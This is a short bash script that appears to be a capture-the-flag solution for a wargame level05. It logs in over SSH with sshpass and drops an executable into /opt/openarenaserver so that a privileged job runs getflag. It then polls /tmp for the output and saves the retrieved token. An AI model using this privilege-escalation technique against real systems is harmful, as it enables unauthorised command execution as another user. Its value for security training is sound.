#!/usr/bin/env bash

SCRIPT='
echo "getflag > /tmp/flag05" > /opt/openarenaserver/flag;
chmod +x /opt/openarenaserver/flag;
while :;
do
  if [ -f "/tmp/flag05" ]; then
    cat /tmp/flag05;
    break;
  fi;
  sleep 10;
done;
'

if [ ! -z "$1" ] && [ ! -z "$2" ] && [ ! -z "$3" ]; then
	PASS=$(sshpass -p $3 ssh -o StrictHostKeyChecking=no level05@$1 -p $2 "$SCRIPT")
	PASS=$(echo $PASS | awk '{print $NF}')
	echo "$PASS"
	echo "$PASS" | awk 'END{print}' > flag05.pwd
else
	echo "Usage: ./flag05.sh <ip address> <port> <password>"
fi
